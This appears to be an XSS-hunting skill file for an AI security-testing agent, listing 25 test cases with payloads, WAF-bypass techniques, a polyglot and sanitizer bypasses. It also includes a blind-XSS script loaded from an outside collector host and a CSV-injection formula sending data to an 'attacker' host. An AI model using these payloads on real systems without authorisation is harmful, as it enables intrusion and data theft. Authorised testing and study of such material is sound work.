# XSS Hunting Skill — 25 Test Cases

> Load when: XSS, cross-site scripting, DOM vulnerability, reflected XSS, stored XSS.

## 1. Reflected XSS in search bar (easy)
Find every search input on the page. Check max character limits. Submit `"><svg/onload=alert(1)>` and report whether it reflects unescaped into the DOM. Capture request, response, and rendered HTML.

## 2. Stored XSS in profile fields (medium)
For every user-editable profile field (name, bio, website, location), submit `<img src=x onerror=alert(document.domain)>`. Re-render the profile as same user and another user. Report which fields persist the payload and where it executes.

## 3. DOM XSS via URL fragment (medium)
Crawl all routes and grep client JS for sinks: `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location`, `dangerouslySetInnerHTML`. For each sink, trace whether `location.hash`/`search`/`referrer` reaches it without sanitization. Report source-to-sink path.

## 4. XSS via SVG upload (medium)
Upload an SVG containing `<script>alert(1)</script>` to every file upload endpoint. After upload, fetch the file URL directly and report whether Content-Type is `image/svg+xml` and whether script tags execute.

## 5. XSS via PDF / HTML render (hard)
Test if uploaded PDFs or HTML files are served inline (no `Content-Disposition: attachment`) from same origin. If so, craft a PDF with embedded JS and confirm execution in app origin.

## 6. XSS via Markdown renderer (medium)
Submit `[click](javascript:alert(1))`, `<details open ontoggle=alert(1)>`, and raw HTML to every markdown input. Report which payloads survive the sanitizer.

## 7. XSS via JSON content-type confusion (hard)
Find endpoints that echo JSON. Force HTML by manipulating `Accept` headers or appending `?callback=` for JSONP. Inject script via reflected parameter.

## 8. Mutation XSS in sanitizers (hard)
If app uses DOMPurify or sanitize-html, test: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`. Report sanitizer version and bypass.

## 9. XSS via CSP bypass (hard)
Read CSP header. If it allows `unsafe-inline`, `unsafe-eval`, `*`, `data:`, or whitelists a JSONP endpoint, craft payload satisfying CSP and demonstrate execution.

## 10. XSS via error pages (easy)
Trigger every error condition (404, 500, validation errors) with `<svg onload=alert(1)>` in path, query, headers (User-Agent, Referer). Check if error pages reflect input unescaped.

## 11. XSS in PostMessage handlers (hard)
Find `window.addEventListener('message', ...)` handlers. Check if they validate `event.origin`. If not, send crafted message from attacker page.

## 12. XSS via Angular/React template injection (hard)
Angular: inject `{{constructor.constructor('alert(1)')()}}` into bindings. React: inject through `dangerouslySetInnerHTML` reachable inputs.

## 13. XSS via SVG `<use>` xlink:href (hard)
Upload SVG with `<use xlink:href="data:image/svg+xml;base64,..."/>` referencing payload-bearing SVG. Test if inline-loaded SVG scripts execute.

## 14. XSS via filename reflection (easy)
Upload file named `"><img src=x onerror=alert(1)>.png`. Browse to page that lists/preview uploads. Report filename reflection points.

## 15. XSS via HTTP header reflection (medium)
Set `User-Agent`, `Referer`, `X-Forwarded-For` to `<script>alert(1)</script>` and visit each page. Check error pages, admin logs, dashboards.

## 16. XSS via email content (medium)
Send emails containing payload in display name/subject. Check rendered HTML in inbox views the app exposes (admin, support).

## 17. XSS in CSV / Excel export (easy)
Inject `=cmd|'/C calc'!A1` and `=HYPERLINK("http://attacker/?"&A1)` into exported fields. Report CSV injection vectors.

## 18. XSS via redirect URL (easy)
Find `?redirect=`, `?next=`, `?returnUrl=` parameters. Try `javascript:alert(1)` and `data:text/html,...`. Report which schemes are accepted.

## 19. Self-XSS escalated via CSRF (hard)
If setting accepts XSS payload only from user themselves, check if it can be set via CSRF (no token, weak SameSite). Combine to escalate.

## 20. XSS via WebSocket message echo (medium)
If app uses WebSockets, send `<img src=x onerror=alert(1)>` messages and check if other clients render them unescaped.

## 21. XSS via OAuth state parameter (medium)
Set `state` param in OAuth flows to XSS payload. Check if callback page reflects it on error.

## 22. Blind XSS in admin panels (medium)
Inject `<script src=//xss.report/c/yourid></script>` into fields admin/support might view. Wait for callback.

## 23. XSS via charset confusion (hard)
Set page charset to UTF-7, inject `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`. Also test BOM, EBCDIC tricks.

## 24. XSS in PDF viewer query params (hard)
If app uses pdf.js with `?file=`, supply XSS payload via URL fragment or malicious PDF URL.

## 25. XSS via clipboard paste handlers (hard)
Find paste event handlers that build HTML from clipboard. Paste HTML fragment with active content into rich editors.

---

## Context-Aware Payloads
### HTML Context
`<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `<iframe src="javascript:alert(1)">`

### Attribute Context
`" onfocus=alert(1) autofocus="`, `' onmouseover=alert(1) '`, `"><img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`

### JavaScript Context
`'-alert(1)-'`, `\';alert(1)//`, `"-alert(1)-"`, `'+alert(1)+'`, `</script><svg onload=alert(1)>`

### WAF Bypass
| Level | Technique | Example |
|-------|-----------|---------|
| 1 | Case variation | `<sCrIpT>` |
| 2 | Double encoding | `%253Cscript%253E` |
| 3 | Null bytes | `<scr%00ipt>` |
| 4 | Tag alternatives | `<svg onload=alert(1)>` |
| 5 | Event handlers | `<body onpageshow=alert(1)>` |
| 6 | Encoding tricks | `&#97;&#108;&#101;&#114;&#116;` |
| 7 | Polyglot | `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//` |
| 8 | Mutation XSS | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
| 9 | DOM clobbering | `<a id=body><a id=name>...` |
| 10 | CSS injection | `background:url(javascript:alert(1))` |

## DOM XSS Sinks
`eval()`, `setTimeout()`, `setInterval()`, `document.write()`, `innerHTML`, `outerHTML`, `location`, `document.location`, `window.location`, `$.html()`, `$.append()`, `Element.insertAdjacentHTML()`
